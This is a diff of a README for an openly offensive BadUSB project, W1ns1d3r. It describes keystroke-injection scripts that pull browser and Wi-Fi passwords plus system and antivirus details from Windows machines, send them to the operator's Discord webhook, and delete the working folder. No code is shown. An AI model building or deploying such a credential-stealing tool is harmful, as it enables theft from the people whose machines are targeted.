@@ -5,7 +5,9 @@
 This project is a BadUSB mix of some rubber ducky scripts.
 
 - **Version:** [2.2]
-- **Average Time :** 30 Secs
+- **Average Time :** 
+  - W1ns1d3r_f4st : 3 Secs
+  - W1ns1d3r_st4gg3d : 30 secs
 - **Target:** Windows 10/11 (7/8 not tested)
 - **Supported Layout keyboard:** US/FR/DE
 - **Author:** [Gvte-kali](https://github.com/Gvte-Kali/BadStuffHosting)
@@ -19,11 +21,29 @@ This project is a BadUSB mix of some rubber ducky scripts.
 
 ## Features 
 
-**W1ns1d3r** 
-- Uses Discord or Dropbox Webhook
+**W1ns1d3r_st4gg3d:** 
+- The informations the script pulls :
+    - Stage 1 :
+        - Web browser passwords
+    - Stage 2 :
+        - Antivirus software and version
+        - User informations
+        - System informations
+        - Wifi passwords
+- Post everything in your discord webhook
+- Notes : The program works on the C:\temp directory and deletes it when the files are uploaded.
   
-**W1ns1d3r_Tr3ll0** 
-- Uses Trello API
+**W1ns1d3r_f4st** 
+- Don't get the administrative privileges on target.
+- Sets the working directory to C:\temp.
+- The informations the script pulls :
+    - Stage 2 :
+        - Antivirus software and version
+        - Hardware informations
+        - System informations
+        - Wifi passwords
+- Post everything in your discord webhook
+- Notes : The program works on the C:\temp directory and deletes it when the files are uploaded.
   
 ## How to use
 - Download the [.txt] file, put your webhook inside it. 
